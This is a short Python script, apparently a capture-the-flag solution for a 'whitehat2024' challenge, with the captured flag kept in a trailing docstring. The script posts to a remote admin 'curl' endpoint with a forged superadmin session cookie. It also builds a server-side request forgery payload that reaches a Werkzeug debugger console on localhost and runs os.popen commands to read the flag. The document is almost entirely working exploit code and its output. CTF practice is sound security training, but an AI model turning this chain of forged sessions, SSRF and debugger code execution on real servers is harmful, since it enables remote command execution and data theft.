import requests 

url = "http://13.125.199.169:10001/" 

cmd = "ls%20-al%20/flag"
payload = f"ifconfig.me -b __wzd6c64e3debe8f9d33596f=1729317583|1d9816665d29 http://13.125.199.169:10001@127.0.0.1:5000/console?__debugger__=yes&cmd=__import__(%22os%22).popen(%22{cmd}%22).read();&frm=0&s=gsiLCDxuAQWX7VNi50Zp"
r = requests.post(
    f"{url}/admin/curl?", 
    cookies={"session": "eyJ1c2VybmFtZSI6InN1cGVyYWRtaW4ifQ.ZxMh9Q.8m4ivnxx5UNtlUp8uOmcwtpR3Fs"},
    data={
        "filename": "/flag"
    }
)
print(r.text)

# ifconfig.me -b __wzd6c64e3debe8f9d33596f=1729317583|1d9816665d29 http://13.125.199.169:10001@127.0.0.1:5000/console?__debugger__=yes&cmd=__import__(%22os%22).popen(%22/readflag%22).read();&frm=0&s=gsiLCDxuAQWX7VNi50Zp

"""
13.125.199.169>>> __import__(&#34;os&#34;).popen(&#34;/readflag&#34;).read();
<span class="string">&#39;
whitehat2024{51bd830107e2bbd5498c5eff9b340b588e4b5fe9e2dd4369a34c77d4acb8a2cf34abc41471d0cfc2be527feec0079a3151866c}
\n&#39;
</span></span>
"""
